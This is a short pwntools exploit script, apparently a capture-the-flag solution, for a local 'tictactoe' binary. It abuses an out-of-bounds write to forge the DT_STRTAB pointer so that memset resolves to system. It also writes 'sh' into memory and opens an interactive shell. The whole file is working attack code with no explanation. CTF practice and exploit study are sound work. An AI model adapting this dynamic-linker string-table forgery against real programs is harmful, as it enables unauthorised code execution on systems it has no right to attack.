from pwn import *

sh=process('./tictactoe')
context.log_level = "debug"

sys_str_addr=0x0804900c
binsh_w_addr=0x0804B048
overwrite_time_addr=0x0804B048# who plays now
dt_strtab=0x0804AF58
# struct,minus the first element

dynstr_addr=0x080482F8
memset_str_addr=0x0804833c

fake_dt_strtab=0x08048fc8
#sys_str_addr-(memset_str_addr-dynstr_addr)

#/bin/sh sh?\x73\x68\x00

def overwrite(ch,addr):
    sh.sendlineafter('flavor): ','9')
    sh.sendline(str(ch))
    addr-=0x804B056
    sh.sendlineafter('flavor): ',str(addr))

sh.sendlineafter("(2)nd? ",'1')

# change overwrite_time
overwrite('\x73',overwrite_time_addr)

# eachtime the addr of who plays now will negate
#so write '/bin/sh' once every other time

overwrite('\x73',binsh_w_addr)
overwrite('\xc8',dt_strtab)
overwrite('\x68',binsh_w_addr+1)
overwrite('\x8f',dt_strtab+1)
overwrite('\x00',binsh_w_addr+2)
overwrite('\x04',dt_strtab+2)
overwrite('\x00',binsh_w_addr+3)
overwrite('\x08',dt_strtab+3)

sh.interactive()
sh.close()